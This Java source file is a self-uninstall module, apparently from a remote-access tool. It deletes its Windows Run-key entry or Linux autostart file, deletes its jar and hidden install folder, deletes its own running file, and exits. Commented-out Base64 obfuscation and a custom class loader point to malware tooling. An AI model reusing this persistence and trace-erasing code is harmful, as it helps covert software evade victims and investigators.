package rt.util;

import java.io.File;
import rt.Inicio;
import comunes.Interfaz;
import rt.interfaces.AR;

public class DINST extends Thread implements Interfaz {

    private String nombreJar;
    private String nombreReg;
    private boolean[] tipo = new boolean[2];
    private File destino;
    private AR registro;
    //private final String R = "U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu";//Software\Microsoft\Windows\CurrentVersion\R
    private final String R = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";//Software\Microsoft\Windows\CurrentVersion\R

    public DINST() {
    }

    private void desinstalar() {
        String so = System.getProperty("os.name").toLowerCase();
        if (so.contains("win")) {
            win_desinstalar();
        } else if (so.contains("linux")) {
            lin_desinstalar();
        } else if (so.contains("mac")) {
            mac_desinstalar();
        }
    }

    private void lin_desinstalar() {
        try {
            File server = new File(Inicio.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            //nombreReg = "Escritorio";
            if (!nombreReg.startsWith(".")) {
                nombreReg = "." + nombreReg;
            }
            File CarpetaParent = new File(System.getenv("HOME"), nombreReg);
//            if (!CarpetaParent.exists()) {
//                CarpetaParent.mkdirs();
//            }
            this.destino = new File(CarpetaParent, this.nombreJar + ".jar");
            if (this.tipo[0] == true) {
                File autoinicio = new File(System.getenv("HOME") + "/.config/autostart/" + nombreJar + ".desktop");
                autoinicio.delete();
            }
            destino.delete();
            server.delete();
            //CarpetaParent.delete();
            UtilRT.eliminar(CarpetaParent.getAbsolutePath());//elimina recursivamente            
            System.exit(0);
        } catch (Exception ex) {
        }
    }

    private void mac_desinstalar() {
    }

    private void win_desinstalar() {
        try {
            try {
                registro = ((AR) new CLRT().loadClass("rt.util.REG").newInstance());
            } catch (Exception ex) {
                registro = null;
            }
            File server = new File(Inicio.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            File CarpetaParent = new File(System.getenv("appdata") + "/" + nombreReg);

            this.destino = new File(CarpetaParent, this.nombreJar + ".jar");
            if (this.tipo[0] == true) {
                try {
                    // registro.deleteValue(0x80000001, B64.decodeString(R), this.nombreReg);
                    registro.deleteValue(0x80000001, R, this.nombreReg);
                } catch (Exception e) {
                }
                try {
                    //registro.deleteValue(0x80000002, B64.decodeString(R), this.nombreReg);
                    registro.deleteValue(0x80000002, R, this.nombreReg);
                } catch (Exception e2) {
                }
            }
            destino.delete();
            server.delete();
            //CarpetaParent.delete();
            UtilRT.eliminar(CarpetaParent.getAbsolutePath());//elimina recursivamente            
            System.exit(0);
        } catch (Exception ex) {
        }
    }

    public void instanciar(Object... parametros) {
        //String nombreJar, String nombreReg, boolean tipo1, boolean tipo2
        this.nombreJar = (String) parametros[0];
        this.nombreReg = (String) parametros[1];
        this.tipo[0] = (Boolean) parametros[2];
        this.tipo[1] = (Boolean) parametros[3];
        start();
    }

    @Override
    public void run() {
        while (true) {
            Inicio.dIn();
            desinstalar();
        }
    }

    public void set(int opcion, Object valor) {
        //throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

    public Object get(int opcion, Object... parametros) {
        return null;
        //throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

    public void ejecutar(int opcion, Object... parametros) {

    }
}
